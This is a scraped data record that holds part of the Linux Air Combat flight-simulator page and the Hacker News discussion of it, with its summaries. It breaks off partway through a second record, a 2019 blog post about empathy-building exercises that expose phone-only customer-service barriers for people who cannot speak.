LinuxAirCombat.com at any time. Configure your Mumble server connection with a simple username that is unique to yourself. We use Mumble's standard Public Key Infrastructure to authenticate users the easy way, so you won't need a password. Our server has dedicated channels for general discussion of LAC, for technical support, and for each of our online missions and their teams.Furthermore, if you install Mumble on the same LINUX machine hosting LAC, you get some additional benefit: LAC will fully integrate your local copy of Mumble into your LAC keyboard controls and cockpit, and it will automatically switch Mumble into the best of our channels for your selected mission and team! (When flying LAC's online missions, you will have best success if you are using Mumble version 1.30 or later. However, LAC can be configured to interface almost as well with older versions of Mumble too. LAC just needs to be told whether your Mumble version is \"old-style\" or \"new-style\". Configure this by editing the \"NetworkMode\" field of the \"LacConfig.txt\" file that you will find in your new, hidden ~/home/.LAC folder, as guided by the helpful text it contains.)You can find help on this and other topics in our \"Beginner Topics\" forum HERE. Pay particular attention to the posting about \"Editing LAC's Configuration File\".UpgradesThe standard, downloadable LAC distribution is tuned for a typical LINUX desktop PC. If your PC is more powerful than the average, you can download enhanced graphic models of the airstrip and aircraft for improved visual appearance. On the other hand, if your PC is less powerful, you can download simplified graphic models to help increase your framerate for smoother flight. Either way, you will want to CLICK HERE to learn about the options. New! The Linux Air Combat Video HowTo!We are building a comprehensive series of short, highly focused YouTube video clips to help you download, install, configure, and enjoy Linux Air Combat. Most of these video clips are less than 5 minutes in length, and many are less than two minutes long, because each covers just a single topic. Organized as a YouTube \"playlist\", you can quickly scan the many separate titles to focus in on a specific problem or area of interest. We are adding titles to this playlist frequently, so if you don't see what you need right now you might find it later. Please use YouTube comments associated with each clip to ask or answer related questions for the LAC community. This advertising-supported effort helps to fund our development, so we appreciate your participation and support.CLICK HERE to go directly to the Linux Air Combat Video HowTo on YouTubeFrequently Asked QuestionsCLICK HERE to go directly to the Linux Air Combat FAQ pageForumsCLICK HERE to go directly to the Linux Air Combat Forums, where you can ask questions and read a great many tips and links to additional resources.Screen shots from recent missions: Low-level air-to-air combat in the desert terrain. The target, heavily damaged and trailing thick clouds of black smoke, is desparately trying to flee from the stream of machine-gun bullets emerging from the player's guns. The player has configured LAC to display Mumble's application frame to the right of the main display window.  Low-level combat versus a Lockheed P38 \"Lightning\" in an island mission. This player has configured LAC for full-screen view, so Mumble's application frame cannot be seen. This player relies on LAC's sophisticated \"Mumble Panel\" to inform him of channels in use, transmission and reception activity, and the names of any players that are speaking.. External, \"head-on\" views of Lockheed's P38 \"Lightning\".",
    "commentLink": "https://news.ycombinator.com/item?id=36934029",
    "commentBody": "Linux Air Combat: free, lightweight and open-source combat flight simulator (askmisterwizard.com)401 points by nateb2022 20  125 commentsButtons840 12 hours ago | next [–] I've wanted a more accessible combat flight simulator. Something like DCS or Falcon BMS with realistic flight physics, but more arcade controls (the aircraft should handle realistically, but I shouldn't have to spend 20 minutes starting the aircraft and pushing simulated buttons and switches in the cockpit, even though I have a great appreciation for that level of detail).I don't want my aircraft to have 99 missiles, and 9999 machine gun rounds. I want to have 2 bombs and 4 air-to-air missiles, and I want to fly a tense 15 minute mission into and out of enemy territory. Battle Royal games have shown players are willing to go 5 or 10 minutes between combat if the tension and possibility of surprise combat is there, and have perma-death, give me that in an air combat game.reply2muchcoffeeman 20 minutes ago | parent | next [–] Modern gaming in general lacks simulator type games. Falcon, Janes Combat Simulations, Silent Hunter, Wing Commander, X-Wing, Tie Fighter, Strike Commander, Mech Warrior 2.I used to need a throttle with a toggle, a hat switch, some buttons, a joystick with a couple of hat switches, trigger, a few thumb buttons and I still needed the keyboard for a few functions because I didn't shell out for a HOTAS setup. Now all games can be played on a console controller with less than half the buttons.replymbo 11 hours ago | parent | prev | next [–] Check out Tiny Combat Arena - https://store.steampowered.com/app/1347550/Tiny_Combat_Arena...replydetritus 20 minutes ago | root | parent | next [–] Thank you for the recommendation - I've wanted a game like this for years, 'a contemporary F-19' and 'by Micrprprose' too - delightful!replythe_af 9 hours ago | root | parent | prev | next [–] +1 to this, and let me elaborate: Tiny Combat Arena focuses on a (somewhat fictional) version of the Harrier Jump Jet and opponents from around that era. Attractive low-poly graphics -- and I do mean attractive -- very good performance and the right balance between arcade and flightsim. There is a flight model to the game, and some weapons systems get simulated in simplified form.Do you remember the flightsims of yore, like F-117? This is it, only with better graphics and flight.replyaitchnyu 8 hours ago | root | parent | next [–] Why does the low poly graphics warm the heart (subjectively) more than LAC and even modern games?replymyth_drannon 56 minutes ago | root | parent | next [–] The same reason why people love impressionist paintings or painting done with large strokes of pallete knive. Leave something for the human brain to fill in, do a small puzzle of connecting shape into something whole.replyrichforrester 4 hours ago | root | parent | prev | next [–] Because it leaves to the imagination, probably.reply_AzMoo 3 hours ago | root | parent | prev | next [–] Loved F-117. Chuck Yeager's Air Combat in the same league.replynightski 1 hour ago | root | parent | prev | next [–] I still have the large binder from the original Falcon 4.0 in my closet. Those were great childhood memories. My machine couldn't run it at first though so I just had to read the manual and fantasize at the time (until I was able to afford a new processor) hahaha.replyomnibrain 4 hours ago | root | parent | prev | next [–] Did I read MicroProse? Did I read that right?Looks like someone who used to work for Bohemia bought the name.replythe_af 1 hour ago | root | parent | next [–] Yes, it's published by MicroProse, but it's really the labor of a single person who started it as a hobby.replyilyt 56 minutes ago | parent | prev | next [–] I have similar feelings for sim racing. I don't care about minutia of exactly tuning every single part of the car, but I want super-realistic handlingreplyisthisfoss 34 minutes ago | root | parent | next [–] There should be a prosumer game in the simracing genre. I don’t want to worry about refueling and tyre replacement, I just want to drive as realistically as a car can in a game. BeamNG is as close as we’re getting but it’s still quite slow and jankyreplyArtWomb 54 minutes ago | parent | prev | next [–] Day-Z with F-14 tomcats ;)Do you recall \"Onslaught Mode\" in Unreal?replywossab 3 hours ago | parent | prev | next [–] War Thunder has a zillion planes, 3 modes of realism (including the one you want), runs native on LINUX and is free to try.replyDaz1 10 hours ago | parent | prev | next [–] Every aircraft in DCS has an auto start function.replyt0mas88 7 hours ago | parent | prev | next [–] DCS has some shortcut keys to do things like automatically running the whole engine start sequence. But I think you'll still need to spend some time on the navigation part to be able to fly a mission.replygreendayle 31 minutes ago | parent | prev | next [–] VTOL VRreplytonmoy 11 hours ago | parent | prev | next [–] Flying a low fi model like the F-15 on DCS was pretty realistic but arcadey at the same time. I could easily map most of the controls on my Xbox controller and have the keyboard ready for those rare casesreplymwambua 9 hours ago | root | parent | next [–] Seconded! The Su-27 is another nice lo-fi plane that ends up being much more fun/easy to fly as a result of its simplicity.replystavros 5 hours ago | root | parent | prev | next [–] I got some voice software for windows (I forget the name now) that's much better for the rare cases. I mapped some stuff to it for DCS and Elite and it was great, I could say stuff and it would happen. It feels very futuristic to say \"landing gear down\" and have the gear start deploying.replysquarefoot 9 hours ago | parent | prev | next [–] No idea if there is something similar native to Linux and Open Source, but back in the day I had lots of fun playing \"Air Conflicts: Pacific Carriers\", which today works with WINE. https://www.youtube.com/watch?v=48L16mmR19Yreplyfock 7 hours ago | parent | prev | next [–] I don't know if it's memory failing but the old Microsoft Combat flight simulators (not sure about physics, it's 20years now) seemed to tick a lot of those boxes (+aircraft models were not thaaat shabby to look at).replynocoiner 12 hours ago | parent | prev | next [–] What about the low(er)-fidelity DCS modules? Are you specifically looking for multiplayer, or would something like Flaming Cliffs 3 appeal to you?replytushar-r 12 hours ago | parent | prev | next [–] Strike Fighters on Android and iOS does this quite well.replykfrzcode 10 hours ago | parent | prev | next [–] If MSFS was a Bethesda game that mod would be the best-selling mod of any modreplyflangola7 10 hours ago | root | parent | next [–] Who sells mods for money?replywiseowise 17 hours ago | prev | next [–] > New: LAC is now available in a special, precompiled, optimized version for Valve Corporation's fabulous \"Steam Deck\" portable gaming PC. All of the controls are configured by default for best use, and it's easy to fly in LAC's online, multi-player, server-based missions without ever needing a keyboard. Even voice comms among players are supported!Perfect.replymyth_drannon 14 hours ago | prev | next [–] Anyone wanting to get into flight simulator programming, I found this little gem of a book \"Flights of fantasy\" https://archive.org/details/flightsoffantasy00lamp It's old but some concepts still applyreplytonyarkles 13 hours ago | parent | next [–] You have just solved an issue for me that has, apparently, bothered me for 30 years. When I was a kid, I saw that book at a bookstore and was so enthralled with it, but I had just started learning C and it was way too expensive for my parents to buy. I have occasionally over the years tried to figure out what book it was but didn’t have any success… until today! So thank you!!!replypaines 1 hour ago | root | parent | next [–] Never heard about the book, but I am truly thankful it was mentioned. I always dreamt about re-creating LHX Attack Chopper.replynurple 10 hours ago | parent | prev | next [–] Found this at a Saver's a few years back (amazing place to find odd books)! Great book to own even if only to see the history of serious flight sim dev from the early days.replybreckinloggins 10 hours ago | parent | prev | next [–] I bought this over 20 years ago and still have my copy. I definitely recommend it.replythetoon 28 minutes ago | prev | next [–] Disclaimer : I have not yet played LAC, but I used to play GL117 (which LAC is heavily based on).Though visually it's bit behind what we've been used to, I found some of the fun I had when much younger in F22 Retaliator. And at least, in GL117 (and LAC, I guess) we have a bit of height variation in terrain ;)replytmtvl 16 hours ago | prev | next [–] The first entry of the Ace Combat flight arcade (as opposed to flight sim) series was released under the title of Air Combat, so I hope Namco ain't gonna bop them for trademark infringement.replyandirk 14 hours ago | parent | next [–] Air Combat was the best jet game ever. It taught me all about how to lock on to targets and how to escape lock. I cant forget that beep-beep-beep sound in my head. Now my car makes that sound when I'm parking in a tight spot.I hope this version has combat.replywbl 12 hours ago | parent | prev | next [–] IANAL but trademarks are complicated and the more descriptive a trademark is the less protection it has especially for a decades old video game no one is selling anymore.replynateb2022 15 hours ago | parent | prev | next [–] According to Wikipedia (https://en.wikipedia.org/wiki/Namco), Namco went defunct on 31 March 2006replywtallis 15 hours ago | root | parent | next [–] It merged in 2006, with Bandai. The combined company is anything but defunct, and their IP is not abandoned or up for grabs.replycxr 3 hours ago | root | parent | next [–] Trademarks are up for grabs when they're abandoned—which this one is. Whether the company still exists is a separate matter.replyjkim1258 15 hours ago | root | parent | prev | next [–] I think it'd be safe to assume that Bandai Namco holds the IP of the former Namcoreplyeaseout 15 hours ago | root | parent | prev | next [–] Ace Combat 7 was published by Bandai Namco in 2019.replypjmlp 2 hours ago | prev | next [–] I guess it would be kind of nice if I would still be playing F-19 Stealth Fighter on MS-DOS, or F/A-18 Interceptor on Amiga, but for modern systems, not really, unless I am on retro mood.replythemodelplumber 14 hours ago | prev | next [–] That's a pretty sweet domain name right there. From the HP (as they say in Japanese):> We're your online technology videomagazine, and we're different from other online magazines because we create all of our own content, and because most of that content is published in sequentially organized YouTube Playlists arranged for easy learning. We offer hundreds of hours of free, high-quality, technology-focused content, with subject matter ranging from how the Internet works through setting up and securing your own home-office network to writing high-performance online game/simulation software!Way to go, there are actually a lot of interesting playlists in there. Even one on running Jane's flight sims which were a favorite back in the day.replyjacquesm 19 hours ago | prev | next [–] Interesting that they decided to stick with Sourceforge after the malware debacle.replypaulcarroty 19 hours ago | parent | next [–] Sourceforge has new owners AFAIR.replybadsectoracula 17 hours ago | root | parent | next [–] And by \"new\" we mean since 2016 - the current owners own Sourceforge for almost double the time the previous owners that bundled malware did :-Preplyteekert 15 hours ago | root | parent | next [–] It’s forever a tainted name, I know about the owners, still feels bad.replydspillett 4 hours ago | root | parent | prev | next [–] Goes to show how much better bad news travels, and/or how it sticks in the mind. I could have sworn that the DevShare thing was more recent than from 2013 to 2016, and until looking it up just now I was unaware SF had officially ended the practise (with the change if ownership in 2016).replyjoecool1029 19 hours ago | parent | prev | next [–] SF has been through like 2 or 3 owners since then, ancient history at this point.replychucksmash 17 hours ago | root | parent | next [–] As is SF itself.Is there anything to recommend it now, aside from inertia of already being on SF?replybombcar 13 hours ago | root | parent | next [–] Slashdot reports that Netcraft confirms that source forge is dead.replynocoiner 12 hours ago | root | parent | next [–] Funny and insightful.replybadsectoracula 11 hours ago | root | parent | prev | next [–] It provides mailing lists, forums and isn't locked to a single type of VCS (in fact it doesn't even need a VCS at all, you can just release files - or you can host the VCS elsewhere and use it only for releases as, e.g., Free Pascal is doing with having the code in GitLab but all releases in SourceForge). Also as a user it has reviews and the project pages are not frontloaded with the source code but instead a summary that tells you what the program is, review/scores about it and even provide options to get notified whenever new versions are released. Hell, it even has screenshots.Of course it all depends on each project to use them and IMO the SourceForge UX is far from ideal (also the pages load slowly), but at least the functionality is there.replybadsectoracula 17 hours ago | root | parent | prev | next [–] It was only sold once after the debacle, the new owners just changed names at some point.replysamstave 18 hours ago | root | parent | prev | next [–] Maybe, but after that - I havent used them in a very very long time - so their credibility is lost to me, for good.replyDrNosferatu 16 hours ago | prev | next [–] Is there anything like a source port of Chuck Yeager’s Air Combat?I suppose this is not it.replynocoiner 10 hours ago | parent | next [–] You might be interested in Tiny Combat Arena on Steam. Definitely not a source port, but shaping up as a spiritual successor.replymr_briggs 14 hours ago | prev | next [–] This reminds me of a super lightweight flight simulator I played circa 2014 - I cannot remember the name for the life of me, but unlike LAC and GL117, it was only a few hundred kb in size, but was well featured with joystick and network multiplayer support.replysufficer 17 hours ago | prev | next [–] Aces High 3 is a really fun similar fighting ww2 based combat simreplyalmostnormal 15 hours ago | parent | next [–] It's probably the best of its kind (mmo), but the number of players is constantly (slowly) decreasing. Mostly from players getting too old or dieing. Alternatives: Warbirds has even lower numbers. I'm not sure about the current state of the war in the air in WW2-Online.Can an open source game of this kind find players? Probably not many, but possibly dedicated ones. The problem with that target group is that someone will reference the charts from the POH or from published test flight data and complain that the simulation does not match the numbers.replyTylerE 9 hours ago | root | parent | next [–] Wait, Warbirda and WW2 Online are still around?replydargscisyhp 16 hours ago | prev | next [–] Folks here are harsh this looks like a lot of fun.replywhateveracct 14 hours ago | parent | next [–] People here don't even play games they sit at their keyboard and drive-by commentreplyjsight 10 hours ago | parent | prev | next [–] The people who liked it are too busy playing to comment?replyranger207 11 hours ago | prev | next [–] A couple other lightweight flight sims I haven't seen mentioned yet are VTOL VR (VR only as the name suggests) and YSFLIGHTreplynurple 10 hours ago | parent | next [–] Can't recommend VTOL VR enough. Started out with one semi-futuristic jet-pod VTOL aircraft, but has since added a camancheesque helo and an F15-like strike fighter. It does have _some_ pomp in the startup, but really just enough to get you immersed. Something really compelling about pulling the canopy down, waving to your gunner up front, and starting the rotor spinning before easing the collective up and heading to the first waypoint.Weapons systems are similarly difficult-but-not-complex. Have had tons of fun in multiplayer with my kids dogfighting, doing missions, and even full-on wargames with randos online.replyjamesy0ung 12 hours ago | prev | next [–] Looks cool, but I think I've been spoiled by DCSreplydahjelle 14 hours ago | prev | next [–] Has anyone ever tried to get this working on macOS?replyairdjinn 8 hours ago | prev | next [–] I would love to play this on Apple VisionreplyDrThunder 28 minutes ago | parent | next [–] I would recommend VTOL VR if you want a flightsim to play in VR. Works great on my Quest 2.replynocoiner 7 hours ago | parent | prev | next [–] But… why? There are so many other competent, detailed, graphically rich flight sims that I think would run on that and not look like the Star Fox 64 alpha tech demo.replyanthk 18 hours ago | prev | next [–] Amazing changes to GL117 =)Now if they did the same to ACM...Call me odd, but these games were insta-fun. Run, load the levels in seconds, instant fun.The same with Search and Rescue 2. Or the Marathon series. Simple graphics, but engaging gameplay.reply29athrowaway 19 hours ago | prev | next [–] Looks as if OpenGL support was added to Temple OS.replyeaseout 15 hours ago | parent | next [–] It takes me back to the early 90s DOS flight sims I loved, like Aces Over Europe. It was the style at the time!replychha 6 hours ago | root | parent | next [–] Also reminded me of European Air War and Total Air War. Loved how you could affect the campaigns, at least to a certain extent.replywhalesalad 24 minutes ago | parent | prev | next [–] praise bereplyslicktux 19 hours ago | parent | prev | next [–] Must have been a pain porting it to machine code…lolreplymcpackieh 18 hours ago | root | parent | next [–] Surely it would use Holy C.replysamstave 18 hours ago | root | parent | next [–] To The CPU, The GPU and the Magic Smoke, we prey for n00bs.replydeclan_roberts 17 hours ago | parent | prev | next [–] Amazing how low the bar is for FOSS games on Linux.replyalpaca128 15 hours ago | root | parent | next [–] Right now one of the most hyped Battlefield alternatives is Battlebit which looks not very modern but apparently plays so much better than whatever EA put out in recent years that people happily play it.Amazing how low the bar is for AAA games in terms of gameplay and fun.replyNition 15 hours ago | root | parent | next [–] Battlebit and Minecraft (which was mentioned in another reply here) won't ever actually be mistaken for a game from the 1990s, there's way too much detail into the far distance, the lighting is too good, and the UI looks relatively modern (especially in Battlebit).Linux Air Combat on the other hand really does look the way games looked 30 years ago, and the UI looks worse.It's fine, we don't need good graphics in everything. But it will hurt its popularity in a way that Battlebit is not hurt, because people can tell the difference between intentionally making a game with a retro look vs. just not having the art resources for good graphics.replyPxtl 12 hours ago | root | parent | next [–] I've been playing with minetest a bit and the lighting really is the thing that stands out. The animations are noticable when you really watch something, but the difference in how cubes are shaded jumps out at first sight as the thing the commerical game has that really makes it look polished.replypests 12 hours ago | root | parent | next [–] Have you tried MineClone2 which is built with minetest? The minetest guys claim they are only an engine providing tools and are not trying to recreate the minecraft experience. MineClone2 wants to provide an authentic experience and then MineClone5 is the \"new features branch\" but is unstable. Then there is Mineclonia which aims for stability and performance in neglect of MineCraft parity.replyPxtl 52 minutes ago | root | parent | next [–] MineClone2 is exactly what I was thinking of. It looks fine but the lighting/shading effects throughout it look visibly weaker than real Minecraft.replyNexxxeh 15 hours ago | root | parent | prev | next [–] Thank you for making me aware of BattleBit.It looks like Roblox Battlefield.The only real complaints on an otherwise ridiculously overwhelmingly positive Steam page seem to centre around the anti-cheat.The MinSysReq also suggests it'll run on a potato, so it sounds worth a shot!replyavereveard 8 hours ago | root | parent | prev | next [–] But battlebit graphics while low fi is excellently executed, it's 90s in look but 2020 in functionality and concept.replyjkim1258 15 hours ago | root | parent | prev | next [–] Great point & example, but I'm curious how well that translates to simulation games, where immersion is a large part of the selling point, as opposed to fun & tight game mechanics full of balanced flow & fiero.replyjacoblambda 15 hours ago | root | parent | next [–] Isn't one of the main aspects of immersion that it feels like the real thing?That's far harder to do right than graphics and it's going to have a bigger impact on how immersive the game is. You can always improve graphics down the line but getting the mechanics and handling right is a lot more important and will be a lot harder to change later on.replysmackeyacky 11 hours ago | root | parent | next [–] I got absolutely immersed in Indianopolis 500 back in the day[0]. The graphics were pathetic by modern standards but the long races felt like you had to manage a variety of things (tire wear etc) and you really had to commit to it. So I would agree graphics are secondary to the immersion experience.[0] https://en.wikipedia.org/wiki/Indianapolis_500:_The_Simulati...replyummonk 11 hours ago | root | parent | prev | next [–] Whether it looks like the real thing certainly also plays into whether it feels like the real thing.replyjacoblambda 54 minutes ago | root | parent | next [–] Oh absolutely however the \"feel\" matters far more. If the graphics look super dated or minimal but it plays great, you'll still get lots of players however if it looks stellar but plays poorly, you won't retain very many players.replyanthk 15 hours ago | root | parent | prev | next [–] I watched my younger cousing playing the new Rainbow Six. Compared to the fist one, they are completely \"arcadized\". Just a narrow step down from Urban Terror on \"cinematic gameplay\". \"Realist\", but not so much.Graphics, yes. But the actual gameplay... a joke compared to the first Rainbow Six and tactical matches on SWAT3.replynativeit 16 hours ago | root | parent | prev | next [–] It sounds like an excellent platform for artists who might not have a lot of coding skills to contribute graphics toward. Kind of the point, in my mind.replyanonymfus 15 hours ago | root | parent | next [–] I believe it looks and feels like this because of limitations of SDL 1.2, and not because of the lack of art contributions.replyanthk 15 hours ago | root | parent | next [–] SDL 1.2 could call GL just fine. And it does. No, the game was done like that on purpose, on being light and playable.Any serious libre gamer with a big graphics card to test would just launch Flightgear at 4K with the ALS effects on, real time weather and a crazy draw distance over 30 kms with all the shading FX' on. And lots of tweaks that made clouds looks like clouds and not fancy textures or barely recreated shaders.replythomond 3 hours ago | root | parent | prev | next [–] There's usually no bar for FOSS games. It's sort of the point, the makers are doing it for themselves.replydmonitor 17 hours ago | root | parent | prev | next [–] open source doesn’t really mesh well with artists, so most open source games just have terrible graphical assetsreplyboarnoah 15 hours ago | root | parent | next [–] The same problem occurs with almost any of the hundreds of \"rev-share\" or \"lets build a game together\" projects that show up, its quite difficult to find motivated professionals to work on some else's idea especially long term.Games require a lot of consistent output and theming in their assets to make it work, not exactly suitable for piecemeal contribution built with different asset pipelines and quality.What is interesting to see is how a lot of fan remaster projects have this problem to a much lesser degree. Having the touchstone of a shared love for the original makes it much easier to organize and get people to stick around and agree to someone's vision.replymidoridensha 8 hours ago | root | parent | next [–] >What is interesting to see is how a lot of fan remaster projects have this problem to a much lesser degree. Having the touchstone of a shared love for the original makes it much easier to organize and get people to stick around and agree to someone's vision.Well that makes sense: in a remaster, the \"vision\" is really just \"let's modernize this old game\". So everyone knows what it's supposed to look like, basically, because they can just look at the old game itself.replyanthk 17 hours ago | root | parent | prev | next [–] Yes, like Flare, sure.Saying that it's like saying every AAA game it's like an unoptimized Ubisoft crap.replycoldtea 12 hours ago | root | parent | next [–] A handful of counter-examples don't change a statistical reality...replyanthk 17 hours ago | root | parent | prev | next [–] One of the most sold games ever has blocky graphics not much better than a boosted SNES on 3D.Do you realize this graphics settings are done on retro purposes?Go check Flightgear videos with ALS settings and graphics to the max. It might not be MSFS, but for something that also runs under an HD3000 iGPU/UHD600, the graphics are astounding for a community based project.Also, MSFS gets rendered assets and maps from Bing maps, something Flightgear did with Google Maps with a custom build... 10 years ago.replyiLoveOncall 18 hours ago | prev | next [–] Yeah, I don't think \"lightweight\" is very honest when the game looks like this.replyelmomle 17 hours ago | parent | next [–] Sure it is. Nothing in the word \"lightweight\" implies stellar graphics. If anything, it implies that heavy and nonessential things (like cutting-edge graphics) are totally out of scope.replybadsectoracula 17 hours ago | parent | prev | next [–] For a 56MB AppImage binary it looks very good.replydharmab 16 hours ago | parent | prev | next [–] y copy of DCS World (a popular combat flight sim) is around is 426GB. This is positively featherweight for the genre.replynocoiner 15 hours ago | root | parent | next [–] Oh come on, surely that’s an overstate…> Size: 458 GBDamn.replyorangepurple 2 hours ago | root | parent | prev | next [–] My copy of X-Plane with photogrammetric scenery is several terabytesreplyiLoveOncall 15 hours ago | root | parent | prev | next [–] You're comparing something that literally looks like a movie to a game that nobody would even dare giving away for free in cereal packs.replycoldtea 12 hours ago | root | parent | next [–] It's about a little thing called gameplay.People who are into gaming for the visuals and the comparing of the sizes of their 3D cards wont understand this.replyiLoveOncall 3 hours ago | root | parent | next [–] Well surprise (not a surprise at all actually), the gameplay of that game sucks too.replyersatzz 13 hours ago | root | parent | prev | next [–] Giving kids a flight sim in cereal packs? One purposefully made for Linux no less sounds like an awful idea. Of course they don't do that.replymsla 9 hours ago | root | parent | next [–] Does any cereal still come with toys?replydharmab 11 hours ago | root | parent | prev | next [–] Alright, compare to up and coming air combat game Tiny Combat Arena, which requires at least 1GB.replymsla 13 hours ago | root | parent | prev | next [–] Look at Minecraft and say that.Look at Roblox and say that.replyiLoveOncall 7 hours ago | root | parent | next [–] And say what? Minecraft has always had a much nicer look than this game, without talking about the musics, etc. And even to this day it's only around 600MB.Yes, let's compare it to Minecraft. It looks like crap compared to Minecraft.replyanthk 15 hours ago | root | parent | prev | next [–] Untill you play it. I said the same in ~2003 with the first Deus Ex. Dull graphics, not the best usage of the first Unreal engine, cliché conspiacies almost straight from the X-Files series and common urban legens.Yet the emergent gameplay and the semi free-roaming playability made it better than most FPS crapware being shold from 2002 to 2009 save for Half Life 2 and Crysis.This might not be the best game on the flying combat genre, but don't forget that these games are built for fun and if they work on multiplayer, for quick matches quickly forgetting the rest.Heck, a lot of pro FPS players put the texture settings at the core mininum and with a 1920x1080 resolution at best so they can spot the rest of the players at a quick glance...replyanonymfus 15 hours ago | root | parent | next [–] So did you play Linux Air Combat and what are your impressions?replyanthk 3 hours ago | root | parent | next [–] Not LAC, but it's \"dad\" GL-117, yes. Flightgear was much better, (and today FG graphically curb-stomps LAC) but as a quick match against the CPU, it was fine.Xonotic and Red Eclipse 2 began as quick, improved Q3A FPS clones and now they are pretty well known in lots of places with their mechanics being utterly ripped to set fakely placed as novelties and \"revolutionary gameplays\" into propietary AAA games.replycoldtea 12 hours ago | parent | prev | next [–] What do you think lightweight means? I don't think it means what you think it means...replynocoiner 12 hours ago | prev | next [–] Finally, the graphics of an N64 and a 1989 DOS interface, together at last.replykookamamie 8 hours ago | prev [–] Jesus fuck, its graphics look horrible and so 90s.reply",
    "originSummary": [
      "Linux Air Combat is a free and open-source combat flight simulator designed for the Linux community.",
      "It specializes in World War II combat flight simulation and offers multiplayer missions with voice communication.",
      "The simulator is optimized for speed and can run on different computers, including Raspberry Pi.",
      "It features realistic flight models, a range of aircraft options, and advanced systems like radar and IFF.",
      "Efforts are being made to integrate Linux Air Combat into mainstream Linux distributions and repositories.",
      "The simulator also supports online multiplayer missions and strategic conflicts.",
      "It is available through repositories, precompiled binary images, or as source code for compiling."
    ],
    "commentSummary": [
      "Users are discussing their preferences for combat flight simulators with arcade controls and realistic physics.",
      "Nostalgia for classic flight simulators and low-poly graphics is expressed in the discussions.",
      "Different flight simulators for Linux are recommended and shared experiences are discussed.",
      "A flight simulator programming book is mentioned and sparks nostalgia among users.",
      "Comparisons between flight simulators and AAA games are made in the discussion.",
      "FOSS games on Linux and the challenges in finding motivated professionals for game projects are also mentioned."
    ],
    "points": 401,
    "commentCount": 125,
    "retryCount": 0,
    "time": 1690739849
  },
  {
    "id": 36932524,
    "title": "One week of empathy training (2019)",
    "originLink": "https://shkspr.mobi/blog/2019/07/i-feel-hopeless-rejected-and-a-burden-on-society-one-week-of-empathy-training/",
    "originBody": "Terence Eden’s Blog I feel hopeless, rejected, and a burden on society - one week of empathy training By @edent on 2019-07-30accessibility discrimination12 comments1,450 wordsRead ~18,031 times.I've spent a week cosplaying as a disabled user. And I hate it.A couple of months ago, I attended a private talk given by a disabled colleague of mine. \"Everyone should believe disabled people's stories about accessibility problems,\" she said. \"But, given that people don't, here's what I want you to do. Spend one week pretending to be disabled. Pick a disability and try to interact with services as though you have that impairment. Build up some empathy.\"So I did.For a week, I pretended that I was in a wheelchair. I didn't go the full way and buy a cheap chair and try and commute in it. Instead, whenever I was invited to speak at an event, or go to a meeting, I asked if the venue was accessible. To my delight, all of them were. A couple of people told me they'd arrange ramps to the stage, or that they'd need to adjust a podium height if I wanted.Except one. I turned up to find the talk had been moved to the 3rd floor of a building with no lift. I'd specifically asked the organisers if the room was wheelchair friendly. They'd had more people turn up than expected, so moved to a bigger room. At no point did the organisers contact me.I turned up (without a chair) and briefly considered leaving. Instead I sent a sternly worded email.The week left me feeling fairly hopeful. OK, it wasn't a full test - and there was a failure - but in my little bubble of society, people are (mostly) welcoming to wheelchair users.Then it all went wrong.The next week, I tried something different. Approximately 10% of people in the UK have a speech disorder. In the USA, approximately 7.5 million people have trouble using their voices.So, I tried to spend a week without using the phone to contact companies. It was a fucking disaster.I wanted to upgrade my Internet access to a faster speed. Virgin Media provide a web chat - and after a few hours of waiting (seriously!) I had this frustrating exchange (edited for clarity - typos left intact):John: If you wish to avail of this deal . I advise you to call our Customer Care Team. Terence: I can't use the phone due to my disability. Can I chat online to do it? John: To reach our customer care. You can just download the app and quickly chat with the team there; Terence: I've tried using the app - but no one answers. Please can you help me. I've been a customer for 6 years. John: We appreciate your loyalty Terence, but we are are only limited to regular upgrade transacations. Terence: So disabled customers can't upgrade via chat? John: For persons with diabilities, there are options at \"Contact Us\" Terence: I tried that - and it redirected me here. Is there anyone who can help? John: I'm so sorry ternce but transactiosn like this can only be arranged by calling Custome care team.So I asked to cancel my account.Terence: If I want to cancel my account (without using the phone) what can I do? John: the only option though is by calling . Call 150 from your Virgin Media phone or mobile, or call 0345 454 1111 * from any other phone Monday to Friday, 8am until 9pm Saturday, 8am until 8pm and Sunday 8am until 6pm For our text relay service call us free on 18001 0800 052 2164 You can also contact us through a sign language interpreter. Open 7 days a week, 8am until midnight. *For call costs to our team from a Virgin Media home phone, visit our Call costs page. Calls from other networks and mobile may vary. Terence: This is discrimination. I don't know sign language and I don't have text relay. I can't use my voice. I want to contact someone to cancel my account. John: If the voice is the issue, i advise you ask someone to call in your behalf. Terence: I am perfectly capable of managing my affairs - and I don't want to give my password to someone else.And so it went on. I spent hours chatting with different people, and with managers. None of them could help me with an upgrade, or with a cancellation.Virgin accessibility police says:2.1 We are committed to ensuring both vulnerable and disabled customers get fair and appropriate treatment. 2.2 To ensure we meet the needs of current and prospective customers, our sales and support teams are trained to identify and support the accessibility and vulnerability needs people may have. https://www.virginmedia.com/corporate/media-centre/public-policy-statements/accessibility-and-vulnerability-policyAs far as I can see, that's a load of bunkum. If you don't have a voice, you're locked out of Virgin's upgrade and cancellation routes.I raised a complaint, and got back this fairly generic and dismissive response:Please accept my apologies for this experience, , this is not the experience we want for our customers. We have fed your comments back to the relevant team, this will help us to highlight certain training needs and form coaching. There are areas where improvements can always be made, and as a customer-orientated organisation we are always endeavouring to improve both how we deal with customers and the range and quality of the services we offer.No actual resolution. It made me feel like a burden for even asking for help. I can't go through the \"normal\" channels - I have to rely on the good graces of a complaints team. It was frustrating and demoralising.The same thing happened with Thames Water. If you want to move your account, they ask you to fill in a form online. Hurrah! Until you get to one bit of it, where it tells you to ring a phone number.I had a frustrating chat on Twitter with Thames Water. They admitted the phone number was wrong, and struggled to provide me with contact details.I tried to use their complaints process, but that requires a 10 digit account number. But Thames have upgraded me to a 12 digit number - so their own form doesn't work!So now I'm stuck in limbo. Waiting for someone to get back to me. I've told them not to call - but I bet you they try to ring me.My bank had similar issues. UK banking is great for most online users. I was able to set up new payees, order a new card, cancel Direct Debit - all without using my voice. And then I tried to buy a house...I needed to transfer a large sum of money in order to put a deposit down on my new place. It was larger than the standard transfer limit. And the only solution was to call them up.They do have an online messaging service, but from experience it's slow to answer - and I needed to transfer the money immediately (the home buying process in England is dysfunctional). If I truly had no voice, I'd have lost the house I was trying to buy.I appreciate the need for security. And for double-checking transactions. And all that good stuff. But I was trapped. So I caved in and called.I have no mouth and I must screamYou should believe your disabled friends and colleagues when they tell you how crap the world can be.You should also try empathy building exercises. Here are some examples, please add your own in the comments:Go a couple of weeks without using the phone. Which services are closed off to you? Tell people you need an accessible venue for your meetings. How do they respond? Turn off images in your 